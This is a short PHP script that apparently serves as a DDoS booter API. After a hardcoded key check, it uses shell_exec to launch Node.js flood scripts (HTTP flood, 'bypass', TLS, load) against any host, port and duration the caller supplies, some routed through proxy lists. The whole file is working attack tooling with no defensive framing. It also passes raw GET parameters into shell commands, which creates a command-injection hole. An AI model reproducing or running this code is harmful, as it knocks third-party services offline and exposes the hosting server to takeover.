<?php
// Coded by Sword

$key = $_GET['key'];
$host = $_GET['host'];
$port = $_GET['port'];
$time = $_GET['time'];
$method = $_GET['method'];

if ($key == "bhamus") {
    if ($host == null) { echo "Vui long nhap host!!!"; }
    elseif ($port == null) { echo "Vui long nhap port"; }
    elseif ($time == null) { echo "Vui long nhap times"; }
    elseif ($method == null) { echo "Ban hay nhap Method DDoS"; }
    else {
        if ($method == "HTTP-FLOOD") {
            shell_exec("node flood.js $host 12 64 $time");
            echo "Attack send $host \nPort $port \nTimes: $time s \nMethods $method";
        }
        if ($method == "BYPASS") { 
            shell_exec("node bypass.js $host $time 12 prxvn.txt");
            echo "Attack send $host \nPort $port \nTimes: $time s \nMethods $method";
        }
        if ($method == "TLS") { 
            shell_exec("node tls.js $host $time 64 12 proxies.txt");
            echo "Attack send $host \nPort $port \nTimes: $time s \nMethods $method";
        }
        if ($method == "LOAD") { 
            shell_exec("node load.js $host $time 50 12");
            echo "Attack send $host \nPort $port \nTimes: $time s \nMethods $method";
        }
    }
}
else { 
    echo "Key Sai Roi Nhoc !";
}


?>